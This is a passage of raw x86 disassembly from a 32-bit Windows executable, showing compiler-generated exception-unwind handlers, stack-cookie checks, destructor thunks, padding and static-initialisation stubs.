  409288:	8d 75 b8             	lea    -0x48(%ebp),%esi
  40928b:	e9 60 c6 ff ff       	jmp    0x4058f0
  409290:	8b 54 24 08          	mov    0x8(%esp),%edx
  409294:	8d 42 0c             	lea    0xc(%edx),%eax
  409297:	8b 4a b8             	mov    -0x48(%edx),%ecx
  40929a:	33 c8                	xor    %eax,%ecx
  40929c:	e8 df ee ff ff       	call   0x408180
  4092a1:	8b 4a fc             	mov    -0x4(%edx),%ecx
  4092a4:	33 c8                	xor    %eax,%ecx
  4092a6:	e8 d5 ee ff ff       	call   0x408180
  4092ab:	b8 bc b7 40 00       	mov    $0x40b7bc,%eax
  4092b0:	e9 e3 f2 ff ff       	jmp    0x408598
  4092b5:	cc                   	int3
  4092b6:	cc                   	int3
  4092b7:	cc                   	int3
  4092b8:	cc                   	int3
  4092b9:	cc                   	int3
  4092ba:	cc                   	int3
  4092bb:	cc                   	int3
  4092bc:	cc                   	int3
  4092bd:	cc                   	int3
  4092be:	cc                   	int3
  4092bf:	cc                   	int3
  4092c0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4092c3:	83 e0 01             	and    $0x1,%eax
  4092c6:	0f 84 0c 00 00 00    	je     0x4092d8
  4092cc:	83 65 f0 fe          	andl   $0xfffffffe,-0x10(%ebp)
  4092d0:	8b 75 08             	mov    0x8(%ebp),%esi
  4092d3:	e9 18 c6 ff ff       	jmp    0x4058f0
  4092d8:	c3                   	ret
  4092d9:	8b 54 24 08          	mov    0x8(%esp),%edx
  4092dd:	8d 42 0c             	lea    0xc(%edx),%eax
  4092e0:	8b 4a f0             	mov    -0x10(%edx),%ecx
  4092e3:	33 c8                	xor    %eax,%ecx
  4092e5:	e8 96 ee ff ff       	call   0x408180
  4092ea:	b8 e8 b7 40 00       	mov    $0x40b7e8,%eax
  4092ef:	e9 a4 f2 ff ff       	jmp    0x408598
  4092f4:	cc                   	int3
  4092f5:	cc                   	int3
  4092f6:	cc                   	int3
  4092f7:	cc                   	int3
  4092f8:	cc                   	int3
  4092f9:	cc                   	int3
  4092fa:	cc                   	int3
  4092fb:	cc                   	int3
  4092fc:	cc                   	int3
  4092fd:	cc                   	int3
  4092fe:	cc                   	int3
  4092ff:	cc                   	int3
  409300:	8b 45 c8             	mov    -0x38(%ebp),%eax
  409303:	50                   	push   %eax
  409304:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40930a:	59                   	pop    %ecx
  40930b:	c3                   	ret
  40930c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40930f:	83 e0 01             	and    $0x1,%eax
  409312:	0f 84 0c 00 00 00    	je     0x409324
  409318:	83 65 cc fe          	andl   $0xfffffffe,-0x34(%ebp)
  40931c:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  40931f:	e9 cc c5 ff ff       	jmp    0x4058f0
  409324:	c3                   	ret
  409325:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  409328:	e9 c3 c5 ff ff       	jmp    0x4058f0
  40932d:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  409333:	ff 25 d8 a2 40 00    	jmp    *0x40a2d8
  409339:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  40933c:	e9 af c5 ff ff       	jmp    0x4058f0
  409341:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  409344:	e9 a7 c5 ff ff       	jmp    0x4058f0
  409349:	8d 8d 10 ff ff ff    	lea    -0xf0(%ebp),%ecx
  40934f:	ff 25 d8 a2 40 00    	jmp    *0x40a2d8
  409355:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409358:	83 e0 02             	and    $0x2,%eax
  40935b:	0f 84 10 00 00 00    	je     0x409371
  409361:	83 65 cc fd          	andl   $0xfffffffd,-0x34(%ebp)
  409365:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  40936b:	ff 25 e4 a0 40 00    	jmp    *0x40a0e4
  409371:	c3                   	ret
  409372:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  409378:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  40937e:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  409381:	ff 25 18 a1 40 00    	jmp    *0x40a118
  409387:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  40938d:	e9 7e 83 ff ff       	jmp    0x401710
  409392:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  409395:	83 e9 50             	sub    $0x50,%ecx
  409398:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  40939e:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4093a1:	ff 25 18 a1 40 00    	jmp    *0x40a118
  4093a7:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4093aa:	83 e0 04             	and    $0x4,%eax
  4093ad:	0f 84 10 00 00 00    	je     0x4093c3
  4093b3:	83 65 cc fb          	andl   $0xfffffffb,-0x34(%ebp)
  4093b7:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  4093bd:	ff 25 e4 a0 40 00    	jmp    *0x40a0e4
  4093c3:	c3                   	ret
  4093c4:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  4093ca:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  4093d0:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4093d3:	ff 25 18 a1 40 00    	jmp    *0x40a118
  4093d9:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  4093df:	e9 2c 83 ff ff       	jmp    0x401710
  4093e4:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4093e7:	83 e9 50             	sub    $0x50,%ecx
  4093ea:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  4093f0:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4093f3:	ff 25 18 a1 40 00    	jmp    *0x40a118
  4093f9:	8b 54 24 08          	mov    0x8(%esp),%edx
  4093fd:	8d 42 0c             	lea    0xc(%edx),%eax
  409400:	8b 8a 0c ff ff ff    	mov    -0xf4(%edx),%ecx
  409406:	33 c8                	xor    %eax,%ecx
  409408:	e8 73 ed ff ff       	call   0x408180
  40940d:	8b 4a fc             	mov    -0x4(%edx),%ecx
  409410:	33 c8                	xor    %eax,%ecx
  409412:	e8 69 ed ff ff       	call   0x408180
  409417:	b8 b8 b8 40 00       	mov    $0x40b8b8,%eax
  40941c:	e9 77 f1 ff ff       	jmp    0x408598
  409421:	cc                   	int3
  409422:	cc                   	int3
  409423:	cc                   	int3
  409424:	cc                   	int3
  409425:	cc                   	int3
  409426:	cc                   	int3
  409427:	cc                   	int3
  409428:	cc                   	int3
  409429:	cc                   	int3
  40942a:	cc                   	int3
  40942b:	cc                   	int3
  40942c:	cc                   	int3
  40942d:	cc                   	int3
  40942e:	cc                   	int3
  40942f:	cc                   	int3
  409430:	8b 45 ec             	mov    -0x14(%ebp),%eax
  409433:	83 e0 01             	and    $0x1,%eax
  409436:	0f 84 0d 00 00 00    	je     0x409449
  40943c:	83 65 ec fe          	andl   $0xfffffffe,-0x14(%ebp)
  409440:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  409443:	ff 25 e4 a0 40 00    	jmp    *0x40a0e4
  409449:	c3                   	ret
  40944a:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  409450:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  409456:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  409459:	ff 25 18 a1 40 00    	jmp    *0x40a118
  40945f:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  409465:	e9 a6 82 ff ff       	jmp    0x401710
  40946a:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40946d:	83 e9 50             	sub    $0x50,%ecx
  409470:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  409476:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  409479:	ff 25 18 a1 40 00    	jmp    *0x40a118
  40947f:	8b 54 24 08          	mov    0x8(%esp),%edx
  409483:	8d 42 0c             	lea    0xc(%edx),%eax
  409486:	8b 8a 44 ff ff ff    	mov    -0xbc(%edx),%ecx
  40948c:	33 c8                	xor    %eax,%ecx
  40948e:	e8 ed ec ff ff       	call   0x408180
  409493:	b8 0c b9 40 00       	mov    $0x40b90c,%eax
  409498:	e9 fb f0 ff ff       	jmp    0x408598
  40949d:	cc                   	int3
  40949e:	cc                   	int3
  40949f:	cc                   	int3
  4094a0:	8d b5 b0 fe ff ff    	lea    -0x150(%ebp),%esi
  4094a6:	e9 45 c4 ff ff       	jmp    0x4058f0
  4094ab:	8d b5 94 fe ff ff    	lea    -0x16c(%ebp),%esi
  4094b1:	e9 0a c4 ff ff       	jmp    0x4058c0
  4094b6:	8d b5 cc fe ff ff    	lea    -0x134(%ebp),%esi
  4094bc:	e9 ff c3 ff ff       	jmp    0x4058c0
  4094c1:	8b 54 24 08          	mov    0x8(%esp),%edx
  4094c5:	8d 42 0c             	lea    0xc(%edx),%eax
  4094c8:	8b 8a 94 fe ff ff    	mov    -0x16c(%edx),%ecx
  4094ce:	33 c8                	xor    %eax,%ecx
  4094d0:	e8 ab ec ff ff       	call   0x408180
  4094d5:	8b 4a fc             	mov    -0x4(%edx),%ecx
  4094d8:	33 c8                	xor    %eax,%ecx
  4094da:	e8 a1 ec ff ff       	call   0x408180
  4094df:	b8 50 b9 40 00       	mov    $0x40b950,%eax
  4094e4:	e9 af f0 ff ff       	jmp    0x408598
  4094e9:	cc                   	int3
  4094ea:	cc                   	int3
  4094eb:	cc                   	int3
  4094ec:	cc                   	int3
  4094ed:	cc                   	int3
  4094ee:	cc                   	int3
  4094ef:	cc                   	int3
  4094f0:	8d 75 9c             	lea    -0x64(%ebp),%esi
  4094f3:	e9 f8 c3 ff ff       	jmp    0x4058f0
  4094f8:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  4094fe:	83 e0 01             	and    $0x1,%eax
  409501:	0f 84 13 00 00 00    	je     0x40951a
  409507:	83 a5 6c ff ff ff fe 	andl   $0xfffffffe,-0x94(%ebp)
  40950e:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  409514:	ff 25 e4 a0 40 00    	jmp    *0x40a0e4
  40951a:	c3                   	ret
  40951b:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  409521:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  409527:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  40952d:	ff 25 18 a1 40 00    	jmp    *0x40a118
  409533:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  409539:	e9 d2 81 ff ff       	jmp    0x401710
  40953e:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  409544:	83 e9 50             	sub    $0x50,%ecx
  409547:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  40954d:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
  409553:	ff 25 18 a1 40 00    	jmp    *0x40a118
  409559:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  40955f:	83 e0 02             	and    $0x2,%eax
  409562:	0f 84 13 00 00 00    	je     0x40957b
  409568:	83 a5 6c ff ff ff fd 	andl   $0xfffffffd,-0x94(%ebp)
  40956f:	8d 8d 80 fe ff ff    	lea    -0x180(%ebp),%ecx
  409575:	ff 25 e4 a0 40 00    	jmp    *0x40a0e4
  40957b:	c3                   	ret
  40957c:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  409582:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  409588:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  40958e:	ff 25 18 a1 40 00    	jmp    *0x40a118
  409594:	8d 85 28 fe ff ff    	lea    -0x1d8(%ebp),%eax
  40959a:	e9 71 81 ff ff       	jmp    0x401710
  40959f:	8d 75 9c             	lea    -0x64(%ebp),%esi
  4095a2:	e9 49 c3 ff ff       	jmp    0x4058f0
  4095a7:	8d 75 80             	lea    -0x80(%ebp),%esi
  4095aa:	e9 41 c3 ff ff       	jmp    0x4058f0
  4095af:	8d 75 b8             	lea    -0x48(%ebp),%esi
  4095b2:	e9 09 c3 ff ff       	jmp    0x4058c0
  4095b7:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4095ba:	e9 01 c3 ff ff       	jmp    0x4058c0
  4095bf:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  4095c5:	83 e9 50             	sub    $0x50,%ecx
  4095c8:	ff 25 d4 a0 40 00    	jmp    *0x40a0d4
  4095ce:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
  4095d4:	ff 25 18 a1 40 00    	jmp    *0x40a118
  4095da:	8b 54 24 08          	mov    0x8(%esp),%edx
  4095de:	8d 42 0c             	lea    0xc(%edx),%eax
  4095e1:	8b 8a 24 fe ff ff    	mov    -0x1dc(%edx),%ecx
  4095e7:	33 c8                	xor    %eax,%ecx
  4095e9:	e8 92 eb ff ff       	call   0x408180
  4095ee:	8b 4a fc             	mov    -0x4(%edx),%ecx
  4095f1:	33 c8                	xor    %eax,%ecx
  4095f3:	e8 88 eb ff ff       	call   0x408180
  4095f8:	b8 00 ba 40 00       	mov    $0x40ba00,%eax
  4095fd:	e9 96 ef ff ff       	jmp    0x408598
  409602:	cc                   	int3
  409603:	cc                   	int3
  409604:	cc                   	int3
  409605:	cc                   	int3
  409606:	cc                   	int3
  409607:	cc                   	int3
  409608:	cc                   	int3
  409609:	cc                   	int3
  40960a:	cc                   	int3
  40960b:	cc                   	int3
  40960c:	cc                   	int3
  40960d:	cc                   	int3
  40960e:	cc                   	int3
  40960f:	cc                   	int3
  409610:	56                   	push   %esi
  409611:	6a 18                	push   $0x18
  409613:	ff 15 ec a1 40 00    	call   *0x40a1ec
  409619:	83 c4 04             	add    $0x4,%esp
  40961c:	8b f0                	mov    %eax,%esi
  40961e:	68 a0 0f 00 00       	push   $0xfa0
  409623:	56                   	push   %esi
  409624:	ff 15 10 a0 40 00    	call   *0x40a010
  40962a:	89 35 c4 21 41 00    	mov    %esi,0x4121c4
  409630:	5e                   	pop    %esi
  409631:	c3                   	ret
  409632:	cc                   	int3
  409633:	cc                   	int3
  409634:	cc                   	int3
  409635:	cc                   	int3
  409636:	cc                   	int3
  409637:	cc                   	int3
  409638:	cc                   	int3
  409639:	cc                   	int3
  40963a:	cc                   	int3
  40963b:	cc                   	int3
  40963c:	cc                   	int3
  40963d:	cc                   	int3
  40963e:	cc                   	int3
  40963f:	cc                   	int3
  409640:	68 c8 21 41 00       	push   $0x4121c8
  409645:	e8 06 7f ff ff       	call   0x401550
  40964a:	68 90 96 40 00       	push   $0x409690
  40964f:	e8 3b ec ff ff       	call   0x40828f
  409654:	59                   	pop    %ecx
  409655:	c3                   	ret
  409656:	cc                   	int3
  409657:	cc                   	int3
  409658:	cc                   	int3
  409659:	cc                   	int3
  40965a:	cc                   	int3
  40965b:	cc                   	int3
  40965c:	cc                   	int3
  40965d:	cc                   	int3
  40965e:	cc                   	int3
  40965f:	cc                   	int3
  409660:	68 b0 96 40 00       	push   $0x4096b0
  409665:	e8 25 ec ff ff       	call   0x40828f
  40966a:	59                   	pop    %ecx
  40966b:	c3                   	ret
  40966c:	cc                   	int3
  40966d:	cc                   	int3
  40966e:	cc                   	int3
  40966f:	cc                   	int3
  409670:	68 00 97 40 00       	push   $0x409700
  409675:	e8 15 ec ff ff       	call   0x40828f
  40967a:	59                   	pop    %ecx
  40967b:	c3                   	ret
  40967c:	68 32 97 40 00       	push   $0x409732
  409681:	e8 09 ec ff ff       	call   0x40828f
  409686:	59                   	pop    %ecx
  409687:	c3                   	ret
  409688:	cc                   	int3
  409689:	cc                   	int3
  40968a:	cc                   	int3
  40968b:	cc                   	int3
  40968c:	cc                   	int3
  40968d:	cc                   	int3
  40968e:	cc                   	int3
  40968f:	cc                   	int3
  409690:	b9 20 22 41 00       	mov    $0x412220,%ecx
  409695:	e8 76 7f ff ff       	call   0x401610
  40969a:	b9 20 22 41 00       	mov    $0x412220,%ecx
  40969f:	ff 25 e4 a0 40 00    	jmp    *0x40a0e4
  4096a5:	cc                   	int3
  4096a6:	cc                   	int3
  4096a7:	cc                   	int3
  4096a8:	cc                   	int3
  4096a9:	cc                   	int3
  4096aa:	cc                   	int3
  4096ab:	cc                   	int3
  4096ac:	cc                   	int3
  4096ad:	cc                   	int3
  4096ae:	cc                   	int3
  4096af:	cc                   	int3
  4096b0:	a1 68 22 41 00       	mov    0x412268,%eax
  4096b5:	85 c0                	test   %eax,%eax
  4096b7:	74 0a                	je     0x4096c3
  4096b9:	50                   	push   %eax
  4096ba:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4096c0:	83 c4 04             	add    $0x4,%esp
  4096c3:	c7 05 68 22 41 00 00 	movl   $0x0,0x412268
  4096ca:	00 00 00 
  4096cd:	c7 05 6c 22 41 00 00 	movl   $0x0,0x41226c
  4096d4:	00 00 00 
  4096d7:	c7 05 70 22 41 00 00 	movl   $0x0,0x412270
  4096de:	00 00 00 
  4096e1:	c3                   	ret
  4096e2:	cc                   	int3
  4096e3:	cc                   	int3
  4096e4:	cc                   	int3
  4096e5:	cc                   	int3
  4096e6:	cc                   	int3
  4096e7:	cc                   	int3
  4096e8:	cc                   	int3
  4096e9:	cc                   	int3
  4096ea:	cc                   	int3
  4096eb:	cc                   	int3
  4096ec:	cc                   	int3
  4096ed:	cc                   	int3
  4096ee:	cc                   	int3
  4096ef:	cc                   	int3
  4096f0:	b9 8c 22 41 00       	mov    $0x41228c,%ecx
  4096f5:	ff 25 d8 a2 40 00    	jmp    *0x40a2d8
  4096fb:	cc                   	int3
  4096fc:	cc                   	int3
  4096fd:	cc                   	int3
  4096fe:	cc                   	int3
  4096ff:	cc                   	int3
  409700:	a1 78 22 41 00       	mov    0x412278,%eax
  409705:	85 c0                	test   %eax,%eax
  409707:	74 0a                	je     0x409713
  409709:	50                   	push   %eax
  40970a:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  409710:	83 c4 04             	add    $0x4,%esp
  409713:	c7 05 78 22 41 00 00 	movl   $0x0,0x412278
  40971a:	00 00 00 
  40971d:	c7 05 7c 22 41 00 00 	movl   $0x0,0x41227c
  409724:	00 00 00 
  409727:	c7 05 80 22 41 00 00 	movl   $0x0,0x412280
  40972e:	00 00 00 
  409731:	c3                   	ret
  409732:	b9 c4 0c 41 00       	mov    $0x410cc4,%ecx
  409737:	e9 be e9 ff ff       	jmp    0x4080fa
